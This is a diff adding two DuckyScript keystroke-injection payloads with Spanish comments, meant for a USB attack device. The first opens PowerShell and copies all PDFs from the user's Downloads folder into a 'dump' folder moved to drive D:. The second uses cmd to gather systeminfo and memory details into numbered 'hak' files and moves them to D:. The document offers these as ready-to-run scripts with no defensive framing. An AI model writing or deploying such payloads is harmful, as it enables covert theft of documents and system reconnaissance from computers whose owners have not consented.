@@ -1,0 +1,98 @@
+REM --- Script 1: Mover archivos PDF ---
+DELAY 1000
+GUI r
+DELAY 300
+BACKSPACE
+DELAY 300
+STRING powershell
+DELAY 400
+ENTER
+DELAY 1000
+
+REM Crear la carpeta Dump en la carpeta de Descargas
+SHIFT n
+STRING ew-
+SHIFT i
+STRING tem -
+SHIFT i
+STRING tem
+SHIFT t
+STRING ype Directory -
+SHIFT f
+STRING orce -
+SHIFT p
+STRING ath "$env:userprofile\downloads\dump"
+ENTER
+
+DELAY 400
+
+REM Copiar archivos PDF de Descargas a la nueva carpeta Dump
+SHIFT c
+STRING opy-
+SHIFT i
+STRING tem -
+SHIFT p
+STRING ath "$env:userprofile\downloads\*.pdf" -
+SHIFT d
+STRING estination "$env:userprofile\downloads\dump"
+ENTER
+
+DELAY 400
+
+REM Cortar (mover) la carpeta Dump de Descargas a la unidad D:
+SHIFT m
+STRING ove-
+SHIFT i
+STRING tem -
+SHIFT p
+STRING ath "$env:userprofile\downloads\dump" -
+SHIFT d
+STRING estination "D:\"
+ENTER
+
+DELAY 400
+
+STRING exit
+ENTER
+
+---
+
+REM --- Script 2: Extraer y mover información del sistema ---
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 750
+STRING set i=1
+ENTER
+DELAY 100
+STRING :loop
+ENTER
+DELAY 100
+STRING if exist C:\Users\Public\Documents\hak%i%.txt (set /a i+=1 && goto loop)
+ENTER
+DELAY 100
+STRING echo "Extrayendo informacion del sistema..." > C:\Users\Public\Documents\hak%i%.txt
+ENTER
+DELAY 100
+STRING systeminfo >> C:\Users\Public\Documents\hak%i%.txt
+ENTER
+DELAY 100
+STRING echo. >> C:\Users\Public\Documents\hak%i%.txt
+ENTER
+DELAY 100
+STRING echo "Informacion de memoria:" >> C:\Users\Public\Documents\hak%i%.txt
+ENTER
+DELAY 100
+STRING wmic memorychip get capacity >> C:\Users\Public\Documents\hak%i%.txt
+ENTER
+
+REM Mover el archivo hak%i%.txt a la unidad D:
+DELAY 100
+STRING move C:\Users\Public\Documents\hak%i%.txt D:\
+ENTER
+
+DELAY 5000
+STRING exit
+ENTER
